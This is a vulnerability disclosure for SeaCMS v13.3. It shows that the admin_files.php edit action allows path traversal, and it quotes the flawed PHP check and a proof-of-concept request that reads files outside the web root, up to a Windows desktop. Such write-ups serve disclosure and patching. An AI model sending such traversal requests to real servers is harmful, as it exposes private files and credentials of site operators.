  admin_files.php    Arbitrary File Reads

### Introduction

SeaCMS v13.3 has an arbitrary file read vulnerability. This vulnerability is due to the fact that, despite having restrictions on the files to be read, the restrictions are still imperfect, allowing an attacker to arbitrarily read files on the server, not just web directories, including any files on the server.

SeaCMS 官方网站： [SeaCMS - 开源免费 PHP 电影系统、电影 CMS、视频 CMS、电影 CMS、SEACMS](https://www.seacms.com/)

Click to download

![image-20250402105820409](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021122959.png)

You can see the latest version v13.3



### Vulnerability analysis and exploitation

The vulnerable code is located at : When that parameter is passed, there is no path traversal check, allowing the attacker to construct it themselves, which can be done by passing the following parameters

```
if($action=='edit')
{
	if(substr(strtolower($filedir),0,$dirlen)!=$dirTemplate){
		ShowMsg("只允许编辑附件目录！","admin_files.php");
		exit;
	}
	$filetype=getfileextend($filedir);
	if ($filetype!="html" && $filetype!="htm" && $filetype!="js" && $filetype!="css" && $filetype!="txt")
	{
		ShowMsg("操作被禁止！","admin_files.php");
		exit;
	}
	$filename=substr($filedir,strrpos($filedir,'/')+1,strlen($filedir)-1);
	$content=loadFile($filedir);
	$content = m_eregi_replace("<textarea","##textarea",$content);
	$content = m_eregi_replace("</textarea","##/textarea",$content);
	$content = m_eregi_replace("<form","##form",$content);
	$content = m_eregi_replace("</form","##/form",$content);
	include(sea_ADMIN.'/templets/admin_files.htm');
	exit();
}
```

We can construct filedir for directory traversal deletion

```
/4w8vn/admin_files.php?action=edit&filedir=../uploads/../../../../../../key.txt
```

#### Exploit POC

We can create a new test file outside the web directory to do this

![image-20250402123326469](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021241294.png)

Then construct the parameters

![image-20250402123438454](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021242691.png)



With it, we can see that the file has been read successfully

Now let's take it a step further and try to see if we can read the rest of the files on Windows

![image-20250402123635731](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021242530.png)

We can see that the files on the desktop are also read successfully



In summary, an attacker can exploit this vulnerability to read any file on the deployer's computer